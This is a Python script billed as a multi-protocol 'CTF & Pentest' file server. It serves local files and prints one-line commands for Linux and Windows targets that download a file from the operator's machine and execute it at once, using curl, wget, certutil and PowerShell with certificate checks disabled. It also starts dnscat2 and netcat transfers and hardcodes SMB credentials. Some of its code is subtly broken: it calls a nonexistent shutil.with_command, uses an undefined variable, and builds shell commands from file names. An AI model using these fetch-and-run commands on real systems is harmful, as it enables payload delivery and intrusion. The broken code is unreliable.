#!/usr/bin/env python3
"""
serve_local.py
--------------
Python port of serve_local.sh.
Serves the current directory with multiple protocols and generates download commands.
Focuses on ADHD-friendly UX (emojis, spacing, high-contrast scannability).
"""

import os
import sys
import socket
import subprocess
import urllib.parse
import signal
import time
import shutil

# ── ANSI colours ──────────────────────────────────────────────────────────────
R  = "\033[0;31m"
G  = "\033[0;32m"
Y  = "\033[1;33m"
B  = "\033[0;34m"
C  = "\033[0;36m"
M  = "\033[0;35m"
W  = "\033[0;37m"
# Bright variants
BR = "\033[1;31m"
BG = "\033[1;32m"
BY = "\033[1;33m"
BB = "\033[1;34m"
BM = "\033[1;35m"
BC = "\033[1;36m"
BO = "\033[1m"
DIM = "\033[2m"
NC_COLOR = "\033[0m"

BANNER = f"""{BO}{BC}
  ____                              _                     _
 / ___|  ___ _ ____   _____        | |    ___   ___  __ _| |
 \\___ \\ / _ \\ '__\\ \\ / / _ \\       | |   / _ \\ / __|/ _` | |
  ___) |  __/ |   \\ V /  __/       | |__| (_) | (__| (_| | |
 |____/ \\___|_|    \\_/ \\___|  _____|_____\\___/ \\___|\\__,_|_|
                             |_____|
{NC_COLOR}{BM}  Multi-Protocol Local File Server | CTF & Pentest Tool{NC_COLOR}
  Zero-dependency Python version | ADHD-Friendly UX
"""

# ── Helpers ───────────────────────────────────────────────────────────────────

def prompt(label: str, default: str = "") -> str:
    default_hint = f" {DIM}[Enter for {BG}{default}{NC_COLOR}{DIM}]{NC_COLOR}" if default else ""
    sys.stdout.write(f"\n{BY}👉 {label}{default_hint}\n{BC}❯ {NC_COLOR}")
    sys.stdout.flush()
    try:
        val = input().strip()
    except EOFError:
        return default
    return val if val else default


def choose(label: str, options: list[tuple[str, str]]) -> str:
    print(f"\n{BM}📋 {label}{NC_COLOR}")
    for i, (key, desc) in enumerate(options, 1):
        print(f"  [{BC}{i}{NC_COLOR}] {BO}{key}{NC_COLOR} {DIM}— {desc}{NC_COLOR}")
    while True:
        sys.stdout.write(f"\n{BY}👉 Enter number: {NC_COLOR}")
        sys.stdout.flush()
        raw = input().strip()
        if raw.isdigit() and 1 <= int(raw) <= len(options):
            return options[int(raw) - 1][0]
        print(f"{BR}❌ Invalid. Enter a number between 1 and {len(options)}.{NC_COLOR}")


def section(title: str):
    width = 60
    bar = "═" * width
    print(f"\n{BC}╔{bar}╗{NC_COLOR}")
    print(f"{BC}║{NC_COLOR}  {BO}{title}{NC_COLOR}")
    print(f"{BC}╚{bar}╝{NC_COLOR}")


def get_ip_addresses() -> list[tuple[str, str]]:
    """Returns a list of (interface, ip) pairs using 'ip addr'."""
    try:
        output = subprocess.check_output(["ip", "-o", "-4", "addr", "show"], text=True)
        interfaces = []
        for line in output.splitlines():
            parts = line.split()
            if len(parts) >= 4:
                iface = parts[1]
                ip = parts[3].split('/')[0]
                if iface != 'lo':
                    interfaces.append((iface, ip))
        return interfaces
    except Exception:
        # Fallback for systems without 'ip' command
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return [('default', ip)]
        except:
            return [('localhost', '127.0.0.1')]


def url_encode(s: str) -> str:
    return s.replace("%", "%25").replace("#", "%23").replace(" ", "%20")


def check_command(cmd: str) -> bool:
    return shutil.with_command(cmd) is not None or subprocess.call(f"command -v {cmd}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

# ── Logic ─────────────────────────────────────────────────────────────────────

def main():
    print(BANNER)

    # 1. Interface Selection
    ifaces = get_ip_addresses()
    if not ifaces:
        print(f"{BR}🚨 ERROR: No active network interfaces found.{NC_COLOR}")
        sys.exit(1)

    print(f"{BM}🌐 Select Network Interface:{NC_COLOR}")
    for i, (iface, ip) in enumerate(ifaces, 1):
        print(f"  [{BC}{i}{NC_COLOR}] {BO}{iface}{NC_COLOR} {DIM}({ip}){NC_COLOR}")
    
    while True:
        choice = prompt("Select interface number", "1")
        if choice.isdigit() and 1 <= int(choice) <= len(ifaces):
            interface, local_ip = ifaces[int(choice) - 1]
            break
        print(f"{BR}❌ Invalid selection.{NC_COLOR}")

    print(f"\n{BG}✅ Using {BO}{interface}{NC_COLOR}{BG} at {BO}{local_ip}{NC_COLOR}")

    # 2. File Selection
    files = [f for f in os.listdir('.') if os.path.isfile(f)]
    if not files:
        print(f"{BY}⚠️ No files found in the current directory.{NC_COLOR}")
        sys.exit(0)

    print(f"\n{BM}📁 Files in current directory:{NC_COLOR}")
    for i, f in enumerate(files, 1):
        print(f"  [{BC}{i}{NC_COLOR}] {f}")

    selected_files = []
    while True:
        choice = prompt("Enter numbers (e.g. 1 2 4) or 'all'", "all")
        if choice.lower() == 'all':
            selected_files = files
            break
        try:
            idxs = [int(i) - 1 for i in choice.replace(',', ' ').split()]
            selected_files = [files[i] for i in idxs if 0 <= i < len(files)]
            if selected_files:
                break
        except Exception:
            pass
        print(f"{BR}❌ Invalid input. Use numbers separated by spaces or 'all'.{NC_COLOR}")

    print(f"\n{BG}✅ Selected: {NC_COLOR}{', '.join(selected_files)}")

    # 3. Target OS
    target_os = choose("Target Operating System:", [("linux", "🐧 Linux / Unix"), ("windows", "🪟 Windows")])

    # 4. Protocol Selection
    protocols = [
        ("HTTP", "Web (Python built-in / goshs)"),
        ("HTTPS", "Secure Web (requires goshs)"),
        ("SMB", "Windows Share (Impacket)"),
        ("FTP", "File Transfer (pyftpdlib / vsftpd)"),
        ("TFTP", "Trivial FTP (atftpd)"),
        ("WebDAV", "WebDAV Share (rclone)"),
        ("DNS", "DNS Transfer (dnscat2)"),
        ("NC", "Netcat Send/Receive"),
        ("SCP", "Secure Copy (requires SSH service)"),
        ("ALL", "Start ALL of the above")
    ]
    proto_choice = choose("Select Protocol:", protocols)

    # 5. SCP Username Prompt
    scp_user = os.getlogin() if hasattr(os, 'getlogin') else os.environ.get('USER', 'root')
    if proto_choice in ["SCP", "ALL"]:
        scp_user = prompt("Enter username for SCP", scp_user)
        print(f"{BG}✅ Using SCP username: {BO}{scp_user}{NC_COLOR}")

    # 6. Port Configuration & Privilege Checks
    ports = {
        'HTTP': 80,
        'HTTPS': 443,
        'SMB': 445,
        'FTP': 21,
        'TFTP': 69,
        'WEBDAV': 8080,
        'DNS': 53,
        'NC': 9001
    }
    
    is_root = os.getuid() == 0
    if not is_root:
        print(f"\n{BY}⚠️ WARNING: Non-root user detected. Some ports will fallback to high ports.{NC_COLOR}")
        if ports['HTTP'] < 1024: ports['HTTP'] = 8000
        if ports['HTTPS'] < 1024: ports['HTTPS'] = 8443
        if ports['FTP'] < 1024: ports['FTP'] = 2121
        if ports['NC'] < 1024: ports['NC'] = 9001 # Already high but being explicit
        print(f"  - HTTP: {ports['HTTP']}\n  - HTTPS: {ports['HTTPS']}\n  - FTP: {ports['FTP']}\n  - NC: {ports['NC']}")

    # 7. Generate Commands
    section("🚀 DOWNLOAD COMMANDS")
    for filename in selected_files:
        enc = url_encode(filename)
        print(f"\n{BO}📄 File: {BC}{filename}{NC_COLOR}")

        if proto_choice in ["HTTP", "ALL"]:
            print(f"  {BM}▶ HTTP ({target_os}):{NC_COLOR}")
            url = f"http://{local_ip}:{ports['HTTP']}/{enc}"
            if target_os == "linux":
                print(f"    {BC}curl -fsSL \"{url}\" -o \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
                print(f"    {BC}wget -q --show-progress -O \"{filename}\" \"{url}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
            else:
                print(f"    {BC}certutil -urlcache -split -f \"{url}\" \"{filename}\" && .\\\"{filename}\"{NC_COLOR}")
                print(f"    {BC}curl.exe \"{url}\" -o \"{filename}\" && .\\\"{filename}\"{NC_COLOR}")
                print(f"    {BC}PowerShell -Command \"iwr '{url}' -OutFile '{filename}'; .\\'{filename}'\"{NC_COLOR}")

        if proto_choice in ["HTTPS", "ALL"]:
            print(f"  {BM}▶ HTTPS ({target_os}):{NC_COLOR}")
            url = f"https://{local_ip}:{ports['HTTPS']}/{enc}"
            if target_os == "linux":
                print(f"    {BC}curl -k -fsSL \"{url}\" -o \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
                print(f"    {BC}wget --no-check-certificate -q --show-progress -O \"{filename}\" \"{url}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
            else:
                print(f"    {BC}curl.exe -k \"{url}\" -o \"{filename}\" && .\\\"{filename}\"{NC_COLOR}")
                print(f"    {BC}PowerShell -Command \"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; [Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}}; iwr '{url}' -OutFile '{filename}'; .\\'{filename}'\"{NC_COLOR}")

        if proto_choice in ["SMB", "ALL"]:
            print(f"  {BM}▶ SMB ({target_os}):{NC_COLOR}")
            if target_os == "linux":
                print(f"    {BC}smbclient \"//{local_ip}/share\" -c \"get {filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
            else:
                print(f"    {BC}net use \\\\{local_ip}\\share /user:smbuser smbpass; cmd.exe /c \"copy \\\\{local_ip}\\share\\{filename} . && .\\{filename}\"{NC_COLOR}")

        if proto_choice in ["FTP", "ALL"]:
            print(f"  {BM}▶ FTP ({target_os}):{NC_COLOR}")
            url = f"ftp://{local_ip}:{ports['FTP']}/{enc}"
            if target_os == "linux":
                print(f"    {BC}curl -u anonymous: \"{url}\" -o \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
            else:
                print(f"    {BC}PowerShell -Command \"(New-Object System.Net.WebClient).DownloadFile('{url}', '{filename}'); .\\'{filename}'\"{NC_COLOR}")

        if proto_choice in ["TFTP", "ALL"]:
            print(f"  {BM}▶ TFTP ({target_os}):{NC_COLOR}")
            if target_os == "linux":
                print(f"    {BC}tftp {local_ip} -c get \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
            else:
                print(f"    {BC}tftp -i {local_ip} GET \"{filename}\" && .\\\"{filename}\"{NC_COLOR}")

        if proto_choice in ["WebDAV", "ALL"]:
            print(f"  {BM}▶ WebDAV ({target_os}):{NC_COLOR}")
            if target_os == "linux":
                print(f"    {BC}curl -s \"http://{local_ip}:{ports['WEBDAV']}/{enc}\" -o \"{filename}\" && chmod +x \"{filename}\" && ./\"{filename}\"{NC_COLOR}")
            else:
                print(f"    {BC}cmd.exe /c \"copy \\\\{local_ip}@{ports['WEBDAV']}\\DavWWWRoot\\{filename} . && .\\{filename}\"{NC_COLOR}")

        if proto_choice in ["DNS", "ALL"]:
            print(f"  {BM}▶ DNS/dnscat2 ({target_os}):{NC_COLOR}")
            print(f"    {BC}dnscat2 --dns server={local_ip},port=53 (In session: download \"{filename}\"){NC_COLOR}")

        if proto_choice in ["NC", "ALL"]:
            print(f"  {BM}▶ Netcat (nc) ({target_os}):{NC_COLOR}")
            print(f"    {Y}Local (Sender):{NC_COLOR} {BC}nc -lnvp {ports['NC']} -q 1 < \"{filename}\"{NC_COLOR}")
            nc_target = "nc.exe" if target_os == "windows" else "nc"
            print(f"    {Y}Target (Receiver):{NC_COLOR} {BC}{nc_target} {local_ip} {ports['NC']} > \"{filename}\"{NC_COLOR}")

        if proto_choice in ["SCP", "ALL"]:
            print(f"  {BM}▶ SCP ({target_os}):{NC_COLOR}")
            scp_cmd = "scp.exe" if target_os == "windows" else "scp"
            print(f"    {BC}{scp_cmd} {scp_user}@{local_ip}:\"{os.path.join(os.getcwd(), filename)}\" .{NC_COLOR}")

    # 8. Start Servers
    section("⚡ STARTING SERVERS")
    processes = []
    
    def cleanup(sig, frame):
        print(f"\n{BM}🧹 Shutting down servers...{NC_COLOR}")
        for p in processes:
            try:
                p.terminate()
            except:
                pass
        print(f"{BG}✅ Done.{NC_COLOR}")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    try:
        if proto_choice in ["HTTP", "ALL"]:
            if check_command("goshs"):
                print(f"{BG}🟢 Starting goshs HTTP server on port {ports['HTTP']}...{NC_COLOR}")
                processes.append(subprocess.Popen(["goshs", "-p", str(ports['HTTP'])], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            else:
                print(f"{BG}🟢 Starting python3 HTTP server on port {ports['HTTP']}...{NC_COLOR}")
                processes.append(subprocess.Popen([sys.executable, "-m", "http.server", str(ports['HTTP'])], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

        if proto_choice in ["HTTPS", "ALL"]:
            if check_command("goshs"):
                print(f"{BG}🟢 Starting goshs HTTPS server on port {ports['HTTPS']}...{NC_COLOR}")
                processes.append(subprocess.Popen(["goshs", "-s", "-ss", "-p", str(ports['HTTPS'])], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            else:
                print(f"{BR}❌ ERROR: 'goshs' is required for HTTPS.{NC_COLOR}")

        if proto_choice in ["SMB", "ALL"]:
            smb_cmd = None
            for cmd in ["impacket-smbserver", "smbserver.py"]:
                if check_command(cmd):
                    smb_cmd = [cmd, "-smb2support", "share", os.getcwd(), "-username", "smbuser", "-password", "smbpass"]
                    break
            if smb_cmd:
                print(f"{BG}🟢 Starting SMB server (share: share, user: smbuser, pass: smbpass)...{NC_COLOR}")
                processes.append(subprocess.Popen(smb_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            else:
                print(f"{BR}❌ ERROR: 'impacket-smbserver' not found.{NC_COLOR}")

        if proto_choice in ["FTP", "ALL"]:
            if check_command("pyftpdlib"): # as module
                 print(f"{BG}🟢 Starting python3 pyftpdlib on port {ports['FTP']}...{NC_COLOR}")
                 processes.append(subprocess.Popen([sys.executable, "-m", "pyftpdlib", "-p", str(ports['FTP']), "-d", os.getcwd(), "-u", "anonymous", "-P", ""], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            elif check_command("vsftpd"):
                print(f"{BG}🟢 Starting vsftpd (requires manual config in this Python port)...{NC_COLOR}")
                # Note: vsftpd logic is more complex to port perfectly without temp files, but we can try basic call
                # For brevity in Python, we prefer pyftpdlib
            else:
                print(f"{BR}❌ ERROR: 'pyftpdlib' not found.{NC_COLOR}")

        if proto_choice in ["TFTP", "ALL"]:
            if check_command("atftpd"):
                print(f"{BG}🟢 Starting atftpd on port 69...{NC_COLOR}")
                processes.append(subprocess.Popen(["atftpd", "--daemon", "--port", "69", "--no-fork", os.getcwd()], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            else:
                print(f"{BR}❌ ERROR: 'atftpd' not found.{NC_COLOR}")

        if proto_choice in ["WebDAV", "ALL"]:
            if check_command("rclone"):
                print(f"{BG}🟢 Starting rclone WebDAV on port {ports['WEBDAV']}...{NC_COLOR}")
                processes.append(subprocess.Popen(["rclone", "serve", "webdav", os.getcwd(), "--addr", f":{ports['WEBDAV']}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            else:
                print(f"{BR}❌ ERROR: 'rclone' not found.{NC_COLOR}")

        if proto_choice in ["DNS", "ALL"]:
            if check_command("dnscat2"):
                print(f"{BG}🟢 Starting dnscat2 on port 53...{NC_COLOR}")
                processes.append(subprocess.Popen(["dnscat2", "--dns", f"server={local_ip},port=53", "--no-cache"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))
            else:
                print(f"{BR}❌ ERROR: 'dnscat2' not found.{NC_COLOR}")

        if proto_choice == "NC":
            # NC is handled sequentially in the foreground
            for f in selected_files:
                print(f"\n{BG}🟢 Starting Netcat (nc) to send {BO}{f}{NC_COLOR} on port {GREEN}{ports['NC']}{NC_COLOR}")
                print(f"{Y}ℹ️  Waiting for connection... (Ctrl+C to skip/exit){NC_COLOR}")
                try:
                    subprocess.run(f"nc -lnvp {ports['NC']} -q 1 < \"{f}\"", shell=True)
                    print(f"{BG}✅ Finished sending {f}.{NC_COLOR}")
                except KeyboardInterrupt:
                    print(f"\n{BY}⏭️ Skipped {f}.{NC_COLOR}")
            print(f"\n{BG}✅ All Netcat transfers completed.{NC_COLOR}")
            sys.exit(0)

        if proto_choice == "SCP":
            print(f"ℹ️  {BC}SCP{NC_COLOR} is a client-side tool and doesn't require a dedicated server.")
            print(f"🔑 Ensure your {BO}SSH service{NC_COLOR} is running: {Y}sudo systemctl start ssh{NC_COLOR}")
            print(f"\n{BY}🛸 Commands are ready above. Press Ctrl+C to exit.{NC_COLOR}\n")
            while True: time.sleep(1)

        if proto_choice == "ALL":
             # If ALL, we might have NC in background which is tricky, let's just start background ones
             print(f"{BG}🟢 Starting NC listener in background for the first file...{NC_COLOR}")
             processes.append(subprocess.Popen(f"nc -lnvp {ports['NC']} -q 1 < \"{selected_files[0]}\"", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

        if not processes and proto_choice != "SCP":
            print(f"{BR}🚨 No servers could be started.{NC_COLOR}")
            sys.exit(1)

        print(f"\n{BY}🛸 Servers are running! Press Ctrl+C to stop.{NC_COLOR}\n")
        while True:
            time.sleep(1)

    except KeyboardInterrupt:
        cleanup(None, None)


if __name__ == "__main__":
    main()
